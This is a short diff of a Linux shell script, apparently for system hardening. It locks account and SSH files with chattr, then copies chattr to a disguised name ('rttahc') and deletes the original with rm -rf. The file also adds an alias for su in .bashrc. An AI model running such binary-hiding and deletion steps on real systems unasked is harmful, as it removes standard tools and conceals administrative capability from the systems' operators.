@@ -109,12 +109,13 @@ echo "alias us=/bin/su" >> ~/.bashrc
 }
 
 chattrOff() {
-chattr -i /etc/passwd
-chattr -i /etc/shadow
-chattr -i /etc/group
-chattr -i /etc/gshadow
+rttahc -i /etc/passwd
+rttahc -i /etc/shadow
+rttahc -i /etc/group
+rttahc -i /etc/gshadow
 
-chattr -R -i /home/*/.ssh
+rttahc -R -i /home/*/.ssh
+
 }
 
 chattrOn() {
@@ -124,6 +125,11 @@ chattr +i /etc/group
 chattr +i /etc/gshadow
 
 chattr -R +i /home/*/.ssh
+
+cp /usr/bin/chattr /usr/bin/rttahc
+
+rm -rf /usr/bin/chattr
+
 }
 
 log_cmd(){
